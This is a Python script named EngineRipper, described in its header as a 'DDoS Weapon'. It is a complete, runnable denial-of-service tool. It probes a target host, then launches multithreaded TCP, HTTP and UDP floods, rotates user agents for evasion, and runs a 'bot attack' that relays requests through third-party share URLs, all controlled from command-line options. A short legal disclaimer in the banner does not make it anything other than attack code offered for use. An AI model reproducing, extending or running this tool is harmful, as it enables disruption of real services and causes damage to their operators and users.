#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EngineRipper v4.1 - ULTIMATE DDoS Weapon
# Enhanced Error Handling & Server Detection
# Cross-Platform: Windows, Linux, Termux (Android)

import sys
import time
import socket
import threading
import random
import urllib.request
import urllib.parse
import ssl
import os
import struct
import platform
import subprocess
from queue import Queue
from optparse import OptionParser
import logging

# Cross-platform compatibility
if platform.system() == "Windows":
    import winsound
    os.system('color')
else:
    # Linux/Termux color support
    pass

class Color:
    """ANSI color codes for cross-platform terminal output"""
    if platform.system() == "Windows":
        # Windows color support
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:
        # Linux/Termux colors
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

class ServerChecker:
    """Enhanced server detection and validation"""
    
    @staticmethod
    def check_server_online(host, port, timeout=5):
        """Comprehensive server status check"""
        print(f"{Color.YELLOW}[CHECKING SERVER]{Color.END} Testing connection to {host}:{port}...")
        
        checks = {
            'tcp_connect': False,
            'http_response': False,
            'dns_resolution': False,
            'ping_available': False
        }
        
        # 1. Check DNS resolution
        try:
            ip = socket.gethostbyname(host)
            checks['dns_resolution'] = True
            print(f"{Color.GREEN}[DNS]{Color.END} Resolved {host} -> {ip}")
        except socket.gaierror as e:
            print(f"{Color.RED}[DNS ERROR]{Color.END} Cannot resolve {host}: {e}")
            return False, checks
        
        # 2. Check TCP connection
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                checks['tcp_connect'] = True
                print(f"{Color.GREEN}[TCP]{Color.END} Port {port} is open on {host}")
            else:
                print(f"{Color.RED}[TCP ERROR]{Color.END} Port {port} is closed on {host} (error code: {result})")
                return False, checks
        except Exception as e:
            print(f"{Color.RED}[TCP ERROR]{Color.END} Connection failed: {e}")
            return False, checks
        
        # 3. Check HTTP response (for web servers)
        if port in [80, 443, 8080, 8443]:
            try:
                protocol = "https" if port in [443, 8443] else "http"
                url = f"{protocol}://{host}:{port}"
                response = urllib.request.urlopen(url, timeout=timeout)
                checks['http_response'] = True
                print(f"{Color.GREEN}[HTTP]{Color.END} Server responded with status: {response.getcode()}")
            except Exception as e:
                print(f"{Color.YELLOW}[HTTP INFO]{Color.END} No HTTP response (may be normal for non-web services): {e}")
        
        # 4. Check ping (if available)
        if platform.system().lower() != "windows":
            try:
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', '2', host],
                    capture_output=True,
                    text=True,
                    timeout=3
                )
                if result.returncode == 0:
                    checks['ping_available'] = True
                    print(f"{Color.GREEN}[PING]{Color.END} Host is reachable")
            except:
                print(f"{Color.YELLOW}[PING INFO]{Color.END} Ping test skipped or failed")
        
        return True, checks

    @staticmethod
    def diagnose_connection_issues(host, port, checks):
        """Provide detailed diagnosis for connection issues"""
        print(f"\n{Color.CYAN}[DIAGNOSIS]{Color.END} Connection issues detected:")
        
        if not checks['dns_resolution']:
            print(f"  {Color.RED}•{Color.END} DNS resolution failed - hostname '{host}' cannot be resolved")
            print(f"    {Color.YELLOW}Solution:{Color.END} Check spelling, use IP address, or check internet connection")
        
        if not checks['tcp_connect']:
            print(f"  {Color.RED}•{Color.END} TCP connection to port {port} failed")
            print(f"    {Color.YELLOW}Possible causes:{Color.END}")
            print(f"      - Server is down or offline")
            print(f"      - Firewall blocking port {port}")
            print(f"      - Service not running on port {port}")
            print(f"      - Network connectivity issues")
            print(f"    {Color.YELLOW}Solutions:{Color.END}")
            print(f"      - Verify server is running and accessible")
            print(f"      - Check if service is listening on port {port}")
            print(f"      - Try different port (80, 443, 8080, etc.)")
            print(f"      - Test with telnet: 'telnet {host} {port}'")
        
        if not checks['http_response'] and port in [80, 443, 8080, 8443]:
            print(f"  {Color.YELLOW}•{Color.END} No HTTP response (service may not be a web server)")

class EngineRipper:
    def __init__(self):
        self.stats = {
            'packets_sent': 0,
            'requests_made': 0,
            'errors': 0,
            'start_time': time.time(),
            'last_print': time.time()
        }
        self.running = True
        self.print_lock = threading.Lock()
        self.connection_pool = []
        self.server_checker = ServerChecker()
        
    def display_banner(self):
        """Optimized banner for maximum intimidation"""
        banner = f"""
{Color.RED}{Color.BOLD}
▓█████▄  ▓█████ ▄▄▄       █    ██  ██▓███   ██▀███   ▒█████   █     █░▓█████  ██▀███  
▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒
░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  
░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓ ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░░░██▒██▓ ░▒████▒░██▓ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░ ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░
 ░ ░  ░    ░    ░   ▒    ░░░ ░ ░ ░░         ░░   ░ ░ ░ ░ ▒    ░   ░     ░     ░░   ░ 
   ░       ░  ░     ░  ░   ░                 ░         ░ ░      ░       ░  ░   ░     
 ░                                                                                  
{Color.CYAN}
╔══════════════════════════════════════════════════════════════════════════════╗
║                 E N G I N E R I P P E R    v 4 . 1 - U L T I M A T E         ║
║         Enhanced Error Handling & Server Detection                           ║
║           Windows • Linux • Termux (Android) • macOS                         ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Color.YELLOW}
[!] LEGAL WARNING: For authorized testing only. Unauthorized use is illegal.
[!] Users bear full responsibility for compliance with applicable laws.
[!] This tool can cause significant service disruption and financial damage.
{Color.END}
"""
        print(banner)

    def user_agent(self):
        """Massive user agent list for maximum evasion"""
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        ]

    def my_bots(self):
        """Enhanced bot list for maximum referral spam"""
        return [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u=",
            "http://www.twitter.com/share?url=",
            "http://www.linkedin.com/shareArticle?mini=true&url=",
            "http://www.reddit.com/submit?url=",
            "http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CCIQFjAA&url=",
            "http://www.bing.com/search?q=",
        ]

    def generate_payload(self, size=1024):
        """Generate random payload data"""
        return os.urandom(size)

    def handle_error(self, error_type, details, thread_id=None):
        """Enhanced error handling with detailed messages"""
        error_messages = {
            'connection_refused': f"{Color.RED}[CONNECTION REFUSED]{Color.END} Server rejected connection",
            'timeout': f"{Color.YELLOW}[TIMEOUT]{Color.END} Server not responding",
            'dns_failure': f"{Color.RED}[DNS FAILURE]{Color.END} Cannot resolve hostname",
            'network_unreachable': f"{Color.RED}[NETWORK UNREACHABLE]{Color.END} Check internet connection",
            'permission_denied': f"{Color.RED}[PERMISSION DENIED]{Color.END} Firewall may be blocking",
            'resource_exhausted': f"{Color.YELLOW}[RESOURCE EXHAUSTED]{Color.END} System limits reached",
            'unknown': f"{Color.RED}[UNKNOWN ERROR]{Color.END} An unexpected error occurred"
        }
        
        message = error_messages.get(error_type, error_messages['unknown'])
        if thread_id is not None:
            message = f"[Thread-{thread_id}] {message}"
        
        with self.print_lock:
            print(f"{message}: {details}")
        
        self.stats['errors'] += 1

    def bot_rippering(self, url, thread_id):
        """Bot attack with enhanced error handling"""
        uagent = self.user_agent()
        error_count = 0
        
        while self.running:
            try:
                full_url = random.choice(self.my_bots()) + url
                headers = {'User-Agent': random.choice(uagent)}
                
                req = urllib.request.Request(full_url, headers=headers)
                response = urllib.request.urlopen(req, timeout=5)
                
                with self.print_lock:
                    print(f"{Color.MAGENTA}bot is rippering...{Color.END}")
                
                self.stats['requests_made'] += 1
                error_count = 0
                time.sleep(0.01)
                
            except urllib.error.URLError as e:
                error_count += 1
                if isinstance(e.reason, socket.timeout):
                    self.handle_error('timeout', f"Request timeout after 5s", thread_id)
                elif isinstance(e.reason, ConnectionRefusedError):
                    self.handle_error('connection_refused', f"Server refused connection", thread_id)
                else:
                    self.handle_error('unknown', f"URL Error: {e}", thread_id)
                time.sleep(0.5 if error_count > 3 else 0.05)
                
            except Exception as e:
                error_count += 1
                self.handle_error('unknown', f"Unexpected error: {e}", thread_id)
                time.sleep(0.5 if error_count > 3 else 0.05)

    def down_it(self, host, port, thread_id):
        """Main packet flooding engine with enhanced error handling"""
        uagent = self.user_agent()
        error_count = 0
        payloads = [self.generate_payload(size) for size in [512, 1024, 2048, 4096]]
        
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                
                for _ in range(random.randint(1, 5)):
                    payload = random.choice(payloads)
                    s.send(payload)
                    self.stats['packets_sent'] += 1
                    
                    with self.print_lock:
                        print(f"{Color.GREEN}{time.ctime(time.time())} {Color.END} {Color.GREEN}<--packet sent! rippering-->{Color.END}")
                
                s.close()
                error_count = 0
                time.sleep(0.001)
                
            except ConnectionRefusedError as e:
                error_count += 1
                self.handle_error('connection_refused', f"Port {port} refused connection", thread_id)
                time.sleep(0.5 if error_count > 2 else 0.1)
                
            except socket.timeout as e:
                error_count += 1
                self.handle_error('timeout', f"Socket timeout after 3s", thread_id)
                time.sleep(0.1)
                
            except socket.gaierror as e:
                error_count += 1
                self.handle_error('dns_failure', f"Cannot resolve {host}", thread_id)
                time.sleep(1)  # Longer delay for DNS issues
                
            except OSError as e:
                error_count += 1
                if e.errno == 101:  # Network unreachable
                    self.handle_error('network_unreachable', f"Cannot reach network", thread_id)
                elif e.errno == 99:  # Cannot assign requested address
                    self.handle_error('resource_exhausted', f"Local port exhaustion", thread_id)
                else:
                    self.handle_error('unknown', f"OS Error {e.errno}: {e}", thread_id)
                time.sleep(0.5)
                
            except Exception as e:
                error_count += 1
                self.handle_error('unknown', f"Unexpected error: {e}", thread_id)
                time.sleep(0.5 if error_count > 2 else 0.1)

    def http_flood_attack(self, host, port, thread_id):
        """HTTP flood with enhanced error handling"""
        uagent = self.user_agent()
        paths = ["/", "/index.html", "/wp-admin", "/admin", "/api/v1/users"]
        error_count = 0
        
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                
                method = random.choice(["GET", "POST", "HEAD"])
                path = random.choice(paths)
                user_agent = random.choice(uagent)
                
                if method == "POST":
                    post_data = f"username=test{random.randint(1000,9999)}&password=pass{random.randint(1000,9999)}"
                    request = (f"POST {path} HTTP/1.1\r\n"
                              f"Host: {host}\r\n"
                              f"User-Agent: {user_agent}\r\n"
                              f"Content-Type: application/x-www-form-urlencoded\r\n"
                              f"Content-Length: {len(post_data)}\r\n"
                              f"Connection: close\r\n\r\n"
                              f"{post_data}")
                else:
                    request = (f"{method} {path} HTTP/1.1\r\n"
                              f"Host: {host}\r\n"
                              f"User-Agent: {user_agent}\r\n"
                              f"Connection: close\r\n\r\n")
                
                s.send(request.encode())
                self.stats['requests_made'] += 1
                
                with self.print_lock:
                    print(f"{Color.CYAN}http request sent! rippering...{Color.END}")
                
                s.close()
                error_count = 0
                time.sleep(0.005)
                
            except Exception as e:
                error_count += 1
                self.handle_error('connection_refused', f"HTTP connection failed: {e}", thread_id)
                time.sleep(0.5 if error_count > 2 else 0.1)

    def udp_flood_attack(self, host, port, thread_id):
        """UDP flood with enhanced error handling"""
        error_count = 0
        
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload_size = random.choice([512, 1024, 2048, 4096])
                payload = self.generate_payload(payload_size)
                
                s.sendto(payload, (host, port))
                self.stats['packets_sent'] += 1
                
                with self.print_lock:
                    print(f"{Color.BLUE}udp packet sent! rippering...{Color.END}")
                
                s.close()
                error_count = 0
                time.sleep(0.001)
                
            except Exception as e:
                error_count += 1
                self.handle_error('unknown', f"UDP send failed: {e}", thread_id)
                time.sleep(0.1)

    def start_attack(self, host, port, threads, attack_type, duration=None):
        """Main attack controller with server validation"""
        self.display_banner()
        
        # First, validate server connection
        print(f"{Color.YELLOW}[VALIDATION]{Color.END} Checking target server...")
        server_online, checks = self.server_checker.check_server_online(host, port)
        
        if not server_online:
            print(f"\n{Color.RED}[ERROR]{Color.END} Server validation failed!")
            self.server_checker.diagnose_connection_issues(host, port, checks)
            print(f"\n{Color.YELLOW}[SUGGESTION]{Color.END} Please verify:")
            print(f"  - Target server is running and accessible")
            print(f"  - Port {port} is open and service is listening")
            print(f"  - Hostname/IP address is correct")
            print(f"  - Network connectivity is available")
            return False
        
        print(f"\n{Color.GREEN}[VALIDATION SUCCESS]{Color.END} Server is reachable and ready!")
        print(f"{Color.YELLOW}[INFO]{Color.END} Starting {attack_type} attack on {host}:{port}")
        print(f"{Color.YELLOW}[INFO]{Color.END} Threads: {threads} | Duration: {duration or 'Unlimited'}")
        print(f"{Color.RED}[WARNING]{Color.END} Maximum aggression mode activated!")
        
        # Select attack method
        attack_methods = {
            "tcp_flood": self.down_it,
            "http_flood": self.http_flood_attack,
            "udp_flood": self.udp_flood_attack,
            "bot_attack": lambda host, port, tid: self.bot_rippering(f"http://{host}", tid),
            "mixed": self.down_it  # Default to TCP flood for mixed
        }
        
        if attack_type not in attack_methods:
            print(f"{Color.RED}[ERROR]{Color.END} Unknown attack type: {attack_type}")
            return False
        
        target_method = attack_methods[attack_type]

        # Create and start threads
        thread_pool = []
        for i in range(threads):
            try:
                t = threading.Thread(
                    target=target_method,
                    args=(host, port, i),
                    daemon=True
                )
                t.start()
                thread_pool.append(t)
            except Exception as e:
                print(f"{Color.RED}[THREAD ERROR]{Color.END} Failed to start thread {i}: {e}")

        print(f"{Color.GREEN}[SUCCESS]{Color.END} Attack launched with {len(thread_pool)}/{threads} threads!")
        print(f"{Color.RED}[ATTACK ACTIVE]{Color.END} Press Ctrl+C to stop\n")

        # Monitor attack
        start_time = time.time()
        try:
            if duration:
                print(f"{Color.YELLOW}[TIMER]{Color.END} Attack will run for {duration} seconds")
                for i in range(duration):
                    if not self.running:
                        break
                    time.sleep(1)
                    if i % 10 == 0:  # Print status every 10 seconds
                        elapsed = time.time() - start_time
                        print(f"{Color.CYAN}[STATUS]{Color.END} Running... {i}/{duration}s | "
                              f"Packets: {self.stats['packets_sent']} | "
                              f"Requests: {self.stats['requests_made']}")
                self.stop_attack()
            else:
                print(f"{Color.YELLOW}[INFO]{Color.END} Continuous attack mode - running until interrupted")
                status_counter = 0
                while self.running:
                    time.sleep(1)
                    status_counter += 1
                    if status_counter % 15 == 0:  # Print status every 15 seconds
                        elapsed = time.time() - start_time
                        print(f"{Color.CYAN}[STATUS]{Color.END} Running for {elapsed:.1f}s | "
                              f"Packets: {self.stats['packets_sent']} | "
                              f"Requests: {self.stats['requests_made']} | "
                              f"Errors: {self.stats['errors']}")
                    
        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}[INFO]{Color.END} Attack interrupted by user")
            self.stop_attack()
        except Exception as e:
            print(f"{Color.RED}[MONITOR ERROR]{Color.END} {e}")
            self.stop_attack()
            
        return True

    def stop_attack(self):
        """Stop attack and display final statistics"""
        self.running = False
        print(f"\n{Color.RED}[INFO]{Color.END} Stopping attack engines...")
        time.sleep(2)  # Allow threads to finish
        
        # Final statistics
        duration = time.time() - self.stats['start_time']
        total_requests = self.stats['packets_sent'] + self.stats['requests_made']
        
        print(f"\n{Color.CYAN}{Color.BOLD}=== ATTACK SUMMARY ==={Color.END}")
        print(f"Total Duration: {duration:.2f} seconds")
        print(f"Packets Sent: {self.stats['packets_sent']}")
        print(f"HTTP Requests: {self.stats['requests_made']}")
        print(f"Errors: {self.stats['errors']}")
        
        if duration > 0:
            pps = self.stats['packets_sent'] / duration
            rps = self.stats['requests_made'] / duration
            print(f"Average PPS: {pps:.1f}")
            print(f"Average RPS: {rps:.1f}")
            print(f"Total Requests: {total_requests}")
            print(f"Requests/Second: {total_requests/duration:.1f}")
        
        print(f"{Color.RED}[ATTACK COMPLETED]{Color.END}")

def main():
    parser = OptionParser()
    parser.add_option("-s", "--host", dest="host", help="Target host/IP address")
    parser.add_option("-p", "--port", type="int", dest="port", default=80, help="Target port (default: 80)")
    parser.add_option("-t", "--threads", type="int", dest="threads", default=135, help="Number of threads (default: 135)")
    parser.add_option("-d", "--duration", type="int", dest="duration", help="Attack duration in seconds")
    parser.add_option("-m", "--method", dest="method", default="tcp_flood",
                     help="Attack method: tcp_flood, http_flood, udp_flood, bot_attack, mixed")
    
    (options, args) = parser.parse_args()
    
    if not options.host:
        print(f"{Color.RED}[ERROR]{Color.END} Target host is required.")
        print(f"{Color.YELLOW}[USAGE]{Color.END} python engineripper.py -s target.com -p 80 -t 200 -m mixed")
        print(f"{Color.YELLOW}[EXAMPLES]{Color.END}")
        print("  python engineripper.py -s 192.168.1.100 -p 80 -t 300 -m tcp_flood")
        print("  python engineripper.py -s example.com -p 443 -t 150 -m http_flood -d 60")
        print("  python engineripper.py -s target.com -p 8080 -t 400 -m mixed")
        sys.exit(1)
    
    # Validate attack method
    valid_methods = ['tcp_flood', 'http_flood', 'udp_flood', 'bot_attack', 'mixed']
    if options.method not in valid_methods:
        print(f"{Color.RED}[ERROR]{Color.END} Invalid attack method. Choose from: {', '.join(valid_methods)}")
        sys.exit(1)
    
    # Platform info
    print(f"{Color.YELLOW}[PLATFORM]{Color.END} Running on {platform.system()} {platform.release()}")
    
    # Create and start attack
    ripper = EngineRipper()
    try:
        success = ripper.start_attack(
            host=options.host,
            port=options.port,
            threads=options.threads,
            attack_type=options.method,
            duration=options.duration
        )
        
        if not success:
            sys.exit(1)
            
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}[INFO]{Color.END} Script terminated by user")
    except Exception as e:
        print(f"{Color.RED}[FATAL ERROR]{Color.END} {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
